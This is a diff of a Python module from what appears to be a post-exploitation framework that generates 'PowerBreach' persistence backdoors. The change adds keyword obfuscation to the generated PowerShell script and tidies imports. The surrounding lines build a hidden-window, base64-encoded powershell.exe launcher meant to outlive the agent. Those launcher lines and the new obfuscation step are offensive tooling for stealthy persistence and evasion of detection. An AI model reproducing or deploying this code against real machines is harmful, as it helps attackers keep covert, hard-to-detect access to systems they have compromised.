@@ -1,8 +1,11 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
+
 import os
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
+
 
 class Module(object):
 
@@ -177,8 +180,10 @@ Invoke-ResolverBackdoor"""
             print(helpers.color("[+] PowerBreach deaduser backdoor written to " + outFile))
             return ""
 
+        script = helpers.keyword_obfuscation(script)
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
         modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
@@ -188,11 +193,8 @@ Invoke-ResolverBackdoor"""
 
         # set up the start-process command so no new windows appears
         script = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
+        script = helpers.keyword_obfuscation(script)
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
-
-        moduleName = self.info['Name']
-        techniques = self.info['Techniques']
-        software = self.info['Software']
 
         return script
